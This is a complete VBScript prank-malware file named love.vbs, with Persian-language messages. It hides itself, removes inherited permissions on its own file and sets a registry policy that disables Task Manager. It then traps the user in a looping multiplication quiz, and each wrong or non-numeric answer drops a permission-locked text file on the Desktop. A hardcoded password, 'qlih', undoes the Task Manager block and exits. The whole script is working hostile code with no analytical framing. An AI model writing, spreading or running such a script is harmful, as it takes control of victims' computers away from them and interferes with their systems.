Dim objFSO, objFile,num1, num2, userAnswer, correctAnswer,randomFileName,objShell,command

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

objShell.Run "attrib +h love.vbs",0,True
objShell.Run "cmd /c icacls love.vbs /inheritance:r", 0, True
objShell.Run "REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f",0,True

Do
    Randomize
    num1 = Int((90 * Rnd) + 10)
    num2 = Int((90 * Rnd) + 10)
    
    correctAnswer = num1 * num2
    userAnswer = InputBox(num1 & "x" & num2 & "?", "I LOVE YOU:)")
    
    If userAnswer = "" Then
        MsgBox "khali",48,"No"
    ElseIf userAnswer = "qlih" Then
        objShell.Run "REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /f"
        objShell.Run "icacls *.txt /reset"
        MsgBox "Bazi be paian resid.",64,"Bye"
        Exit Do
    ElseIf Not IsNumeric(userAnswer) Then
        MsgBox "Addad Bezan",16,"Error"
        randomFileName = Int((99999 * Rnd) + 10000) & ".txt"
        Set objFile = objFSO.CreateTextFile(objShell.SpecialFolders("Desktop") & "\" & randomFileName, True)
        objFile.WriteLine("Losed")
        objFile.Close
        

        command = "cmd /c icacls """ & objShell.SpecialFolders("Desktop") & "\" & randomFileName & """ /inheritance:r"
        objShell.Run command, 0, True
    ElseIf Int(userAnswer) = correctAnswer Then
        MsgBox "Doroste",0,"True!"

    Else
        randomFileName = Int((99999 * Rnd) + 10000) & ".txt"
        Set objFile = objFSO.CreateTextFile(objShell.SpecialFolders("Desktop") & "\" & randomFileName, True)
        objFile.WriteLine("Hi Bye Mikhori?")
        objFile.Close
        

        command = "cmd /c icacls """ & objShell.SpecialFolders("Desktop") & "\" & randomFileName & """ /inheritance:r"
        objShell.Run command, 0, True
    End If

Loop